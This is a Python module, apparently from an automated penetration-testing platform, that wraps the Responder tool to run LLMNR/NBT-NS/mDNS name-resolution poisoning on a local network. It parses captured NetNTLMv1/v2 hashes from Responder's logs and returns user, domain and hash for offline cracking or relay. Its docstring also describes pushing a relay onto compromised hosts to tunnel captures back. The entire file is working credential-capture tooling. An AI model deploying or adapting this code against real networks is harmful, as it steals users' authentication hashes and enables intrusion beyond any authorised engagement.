"""Responder service on the bridge — background LLMNR/NBT-NS/mDNS poisoning +
NetNTLM hash capture, controlled by the platform.

The bridge runs Responder (github.com/lgandx/Responder, shipped in the sandbox
pack) as a long-lived background process on the local segment. It poisons name
resolution and captures NetNTLMv1/v2 hashes from hosts that try to authenticate,
which the platform reads back for offline cracking / relay planning.

Verbs: responder_start / responder_status / responder_captures / responder_stop.

- ``analyze`` mode is PASSIVE (no poisoning) — safe/stealthy default; it only
  fingerprints who is asking for what. Active poisoning is opt-in.
- Captures are parsed from Responder's log directory (``*-NTLMv*.txt``), so they
  survive across status polls.

Auto-deploy to a compromised host is a separate step (deploy_forwarder) that
pushes a tiny relay onto that host which tunnels its capture back to the bridge —
see the platform-side deploy tool.
"""
import glob
import os
import re
import shutil
import signal
import subprocess
import threading
import time

_LOCK = threading.Lock()
_STATE = {"proc": None, "interface": None, "analyze": True, "log_dir": None,
          "started_at": None}


def _find_responder():
    """Locate the Responder entrypoint.

    Prefer the pack's ``bin/responder`` wrapper — it execs the pack's *bundled*
    python (which carries Responder's deps like aioquic), so it runs even when
    the system python is missing them. Fall back to a PATH binary, then to a raw
    ``Responder.py`` run under the pack's bundled python if one is present, and
    only then to the system ``python3``.
    """
    pack_bases = (os.path.expanduser("~/.strobes-shell-agent/pack"),
                  "/root/.strobes-shell-agent/pack",
                  "/opt/pack", os.path.expanduser("~/.strobes/tools"))
    # 1. pack bin/ wrapper (handles the bundled-python environment for us).
    for base in pack_bases:
        for w in glob.glob(os.path.join(base, "**", "bin", "responder"), recursive=True):
            if os.access(w, os.X_OK):
                return [w]
    # 2. a responder on PATH.
    cand = shutil.which("responder") or shutil.which("Responder.py")
    if cand:
        return [cand]
    # 3. raw Responder.py — run it under the pack's bundled python if available.
    for base in pack_bases:
        for p in glob.glob(os.path.join(base, "**", "Responder.py"), recursive=True):
            pack_root = p.split(os.sep + "share" + os.sep)[0]
            bundled = glob.glob(os.path.join(pack_root, "python", "*", "bin", "python3"))
            return [(bundled[0] if bundled else "python3"), p]
    return None


def _log_dir(entry):
    # Responder writes to <Responder.py dir>/logs by default.
    # entry is either [Responder.py-dir python, Responder.py], [Responder.py],
    # or the pack's [bin/responder] wrapper — resolve the share/responder dir.
    for part in entry:
        if part.endswith("Responder.py"):
            return os.path.join(os.path.dirname(part), "logs")
        if part.endswith(os.path.join("bin", "responder")):
            root = os.path.dirname(os.path.dirname(part))
            return os.path.join(root, "share", "responder", "logs")
    return "/usr/share/responder/logs"


def responder_start(interface=None, analyze=True, wpad=False):
    with _LOCK:
        if _STATE["proc"] and _STATE["proc"].poll() is None:
            return {"success": True, "already_running": True,
                    "interface": _STATE["interface"], "analyze": _STATE["analyze"]}
        entry = _find_responder()
        if not entry:
            return {"success": False, "error": "Responder not found in pack/PATH"}
        iface = interface or _default_iface()
        argv = list(entry) + ["-I", iface]
        if analyze:
            argv.append("-A")          # passive analyze — no poisoning
        if wpad:
            argv.append("-w")
        log_dir = _log_dir(entry)
        try:
            os.makedirs(log_dir, exist_ok=True)
        except Exception:
            pass
        # Responder resolves Responder.conf relative to its cwd — run from the
        # Responder.py dir (== parent of the logs dir) so config/templates load.
        run_cwd = os.path.dirname(log_dir) if os.path.isdir(os.path.dirname(log_dir)) else None
        try:
            proc = subprocess.Popen(
                argv, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                start_new_session=True, cwd=run_cwd)
        except Exception as e:  # noqa: BLE001
            return {"success": False, "error": "spawn failed: %s (needs root/CAP_NET_RAW)" % e}
        _STATE.update({"proc": proc, "interface": iface, "analyze": bool(analyze),
                       "log_dir": log_dir, "started_at": time.time()})
        return {"success": True, "interface": iface, "analyze": bool(analyze),
                "pid": proc.pid}


def responder_status():
    with _LOCK:
        p = _STATE["proc"]
        running = bool(p and p.poll() is None)
        caps = _parse_captures(_STATE.get("log_dir")) if _STATE.get("log_dir") else []
        return {"success": True, "running": running, "interface": _STATE["interface"],
                "analyze": _STATE["analyze"], "started_at": _STATE["started_at"],
                "captures": len(caps)}


def responder_captures():
    caps = _parse_captures(_STATE.get("log_dir"))
    return {"success": True, "captures": caps, "count": len(caps)}


def responder_stop():
    with _LOCK:
        p = _STATE["proc"]
        if not p:
            return {"success": True, "was_running": False}
        try:
            os.killpg(os.getpgid(p.pid), signal.SIGTERM)
        except Exception:
            try:
                p.terminate()
            except Exception:
                pass
        _STATE["proc"] = None
        return {"success": True, "was_running": True}


def _default_iface():
    # first non-loopback interface with an IPv4
    try:
        out = subprocess.run(["ip", "-o", "-4", "route", "show", "default"],
                             capture_output=True, text=True, timeout=5).stdout
        m = re.search(r"dev\s+(\S+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    return "eth0"


def _parse_captures(log_dir):
    """Parse captured NetNTLM hashes from Responder's log files."""
    if not log_dir or not os.path.isdir(log_dir):
        return []
    caps = []
    seen = set()
    for f in glob.glob(os.path.join(log_dir, "*-NTLM*.txt")):
        try:
            with open(f, "r", errors="replace") as fh:
                for line in fh:
                    line = line.strip()
                    if not line or line in seen:
                        continue
                    # Responder hash line: USER::DOMAIN:...  (NetNTLMv1/v2)
                    m = re.match(r"^([^:]+)::([^:]*):", line)
                    if m:
                        seen.add(line)
                        caps.append({"user": m.group(1), "domain": m.group(2),
                                     "type": "NetNTLMv2" if line.count(":") >= 5 else "NetNTLMv1",
                                     "hash": line[:600], "source": os.path.basename(f)})
        except Exception:
            continue
    return caps
